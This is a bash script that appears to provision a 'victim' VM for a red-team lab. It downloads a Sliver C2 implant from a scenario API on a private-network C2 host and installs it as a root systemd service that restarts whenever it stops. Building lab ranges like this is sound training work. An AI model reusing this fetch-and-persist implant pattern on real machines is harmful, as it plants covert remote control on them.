#!/usr/bin/env bash
# Provision a Linux victim VM:
#   1. Wait for the C2 server to come up
#   2. Download the generated implant from the scenario API
#   3. Install it as a systemd service
set -euo pipefail

C2_HOST="${C2_HOST:-192.168.56.10}"
SCENARIO_API="http://${C2_HOST}:8080/api/v1"
IMPLANT_PATH="/usr/local/bin/sliver-implant"
IMPLANT_NAME="victim-linux-$(hostname)"

export DEBIAN_FRONTEND=noninteractive
apt-get update -qq
apt-get install -y --no-install-recommends curl ca-certificates

# ── Wait for scenario API ────────────────────────────────────────────────────
echo "[provision] Waiting for scenario API at ${SCENARIO_API}..."
for i in $(seq 1 60); do
  if curl -sf "${SCENARIO_API}/health" > /dev/null 2>&1; then
    echo "[provision] Scenario API is up"
    break
  fi
  if [ "${i}" -eq 60 ]; then
    echo "[provision] WARNING: Scenario API not reachable after 120s. Continuing without implant."
    exit 0
  fi
  sleep 2
done

# ── Download pre-built implant from scenario API ─────────────────────────────
# The scenario API proxies implant generation via Sliver's Generate RPC.
# If no pre-built implant exists, the victim will poll and retry.
echo "[provision] Requesting implant binary for ${IMPLANT_NAME}..."
HTTP_CODE=$(curl -sf -w "%{http_code}" \
  "${SCENARIO_API}/implant/linux?name=${IMPLANT_NAME}&c2=${C2_HOST}" \
  -o "${IMPLANT_PATH}" 2>/dev/null || true)

if [ "${HTTP_CODE}" = "200" ] && [ -f "${IMPLANT_PATH}" ]; then
  chmod +x "${IMPLANT_PATH}"
  echo "[provision] Implant installed at ${IMPLANT_PATH}"

  cat > /etc/systemd/system/sliver-implant.service << 'EOF'
[Unit]
Description=Sliver Implant
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
ExecStart=/usr/local/bin/sliver-implant
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF

  systemctl daemon-reload
  systemctl enable sliver-implant
  systemctl start sliver-implant
else
  echo "[provision] Implant not available yet (HTTP ${HTTP_CODE})."
  echo "[provision] Generate one with the scenario API or Sliver client and re-provision."
fi

echo ""
echo "═══════════════════════════════════════════════════════"
echo "  Linux victim provisioned"
echo "  Hostname: $(hostname)"
echo "  IP:       $(hostname -I | awk '{print $1}')"
echo "  C2:       ${C2_HOST}:31337"
echo "═══════════════════════════════════════════════════════"
